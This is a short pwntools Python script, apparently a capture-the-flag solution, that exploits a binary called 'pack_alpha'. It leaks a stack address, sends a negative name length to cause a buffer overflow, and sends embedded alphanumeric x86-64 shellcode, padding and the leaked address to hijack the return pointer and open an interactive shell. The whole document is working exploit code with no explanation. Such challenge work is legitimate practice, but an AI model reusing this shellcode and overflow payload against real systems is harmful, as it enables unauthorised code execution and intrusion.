from pwn import *

if __name__=="__main__":

	context(os='linux', arch='amd64')
	p = process('./pack_alpha')
	#p = remote('gc1.eng.run', 32385)
	gdb.attach(p)

	p.recv()
	p.sendline('b'*3)
	p.recv()
	p.sendline('12')
	p.recvuntil('Your room number is: ')
	leak = p.recvline()[:-1]
	leak = int(leak, 16)
	info("leak: %s"%hex(leak))

	p.recvuntil('Length of your name: ')
	p.sendline('-1')

	# alpha numeric shellcode:
	shell = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'

	pay = shell
	pay += 'a'*(0x80 - len(shell))
	pay += 'b'*8
	pay += p64(leak)
	p.send(pay)

	p.interactive()

